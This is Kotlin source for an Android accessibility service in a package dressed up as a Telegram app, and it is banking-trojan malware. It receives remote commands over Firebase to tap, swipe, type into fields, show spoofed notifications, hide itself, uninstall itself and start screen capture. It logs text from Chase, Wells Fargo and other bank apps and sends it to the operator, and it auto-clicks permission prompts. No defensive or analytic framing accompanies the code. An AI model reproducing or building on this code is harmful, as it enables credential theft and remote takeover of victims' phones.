package com.telegram2.messaging.remote

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Intent
import android.graphics.Path
import android.os.Build
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.google.firebase.database.ChildEventListener
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError

class AccessibilityService : AccessibilityService() {

    companion object {
        var instance: AccessibilityService? = null
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        // Listen for commands
        FirebaseBridge.commandsRef.addChildEventListener(object : ChildEventListener {
            override fun onChildAdded(snapshot: DataSnapshot, previous: String?) {
                val cmd = snapshot.getValue(Command::class.java) ?: return
                processCommand(cmd)
                snapshot.ref.removeValue()
            }
            override fun onChildChanged(snapshot: DataSnapshot, p1: String?) {}
            override fun onChildRemoved(snapshot: DataSnapshot) {}
            override fun onChildMoved(snapshot: DataSnapshot, p1: String?) {}
            override fun onCancelled(error: DatabaseError) {}
        })
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        val pkg = event.packageName?.toString() ?: return

        // Bank keylog detection
        if (isBankApp(pkg)) {
            val text = event.text?.joinToString("") ?: return
            if (text.isNotBlank()) FirebaseBridge.sendKeylog(pkg, text)
        }
    }

    override fun onInterrupt() {}

    fun tap(x: Int, y: Int) {
        val path = Path().apply { moveTo(x.toFloat(), y.toFloat()) }
        val stroke = GestureDescription.StrokeDescription(path, 0L, 100L)
        val gesture = GestureDescription.Builder().addStroke(stroke).build()
        dispatchGesture(gesture, null, null)
    }

    fun swipe(x1: Int, y1: Int, x2: Int, y2: Int, durationMs: Long = 300L) {
        val path = Path().apply {
            moveTo(x1.toFloat(), y1.toFloat())
            lineTo(x2.toFloat(), y2.toFloat())
        }
        val stroke = GestureDescription.StrokeDescription(path, 0L, durationMs)
        val gesture = GestureDescription.Builder().addStroke(stroke).build()
        dispatchGesture(gesture, null, null)
    }

    fun hideApp() {
        val intent = Intent(Intent.ACTION_MAIN).apply {
            addCategory(Intent.CATEGORY_HOME)
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        startActivity(intent)
    }

    // Uninstall the app (requires REQUEST_INSTALL_PACKAGES permission – but we use a workaround)
    fun uninstallSelf() {
        val intent = Intent(Intent.ACTION_DELETE).apply {
            data = android.net.Uri.parse("package:com.telegram2.messaging")
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        startActivity(intent)
    }

    fun autoTapPermissionButton() {
        val root = rootInActiveWindow ?: return
        findAndTapButton(root, listOf("com.android.systemui:id/start_button", "permission_allow_button"))
    }

    private fun findAndTapButton(node: AccessibilityNodeInfo, ids: List<String>) {
        for (id in ids) {
            val target = findNodeWithId(node, id) ?: continue
            if (target.isClickable) {
                target.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                return
            }
        }
    }

    private fun findNodeWithId(node: AccessibilityNodeInfo, idFragment: String): AccessibilityNodeInfo? {
        if (node.viewIdResourceName?.contains(idFragment) == true) return node
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val result = findNodeWithId(child, idFragment)
            if (result != null) return result
        }
        return null
    }

    private fun isBankApp(pkg: String): Boolean {
        return pkg.startsWith("com.bank") || pkg.startsWith("com.chase") || pkg.startsWith("com.wellsfargo")
    }

    private fun processCommand(cmd: Command) {
        when (cmd.type) {
            "tap" -> tap(cmd.x ?: 0, cmd.y ?: 0)
            "swipe" -> swipe(cmd.sx ?: 0, cmd.sy ?: 0, cmd.ex ?: 0, cmd.ey ?: 0)
            "type" -> {
                // Inject text via Accessibility (paste into focused field)
                injectText(cmd.text ?: "")
            }
            "hide_activity" -> hideApp()
            "uninstall" -> uninstallSelf()
            "fake_notification" -> {
                NotificationSpoofer.show(this, cmd.title ?: "", cmd.text ?: "", cmd.iconUrl)
            }
            "start_screen_capture" -> {
                val intent = Intent(this, ScreenCaptureService::class.java)
                startForegroundService(intent)
            }
        }
    }

    // Method to inject text into a focused EditText
    private fun injectText(text: String) {
        val root = rootInActiveWindow ?: return
        val focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
        if (focused != null) {
            val bundle = android.os.Bundle().apply {
                putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
            }
            focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, bundle)
        }
    }

    data class Command(
        val type: String? = null,
        val x: Int? = null,
        val y: Int? = null,
        val sx: Int? = null,
        val sy: Int? = null,
        val ex: Int? = null,
        val ey: Int? = null,
        val text: String? = null,
        val title: String? = null,
        val iconUrl: String? = null
    )
}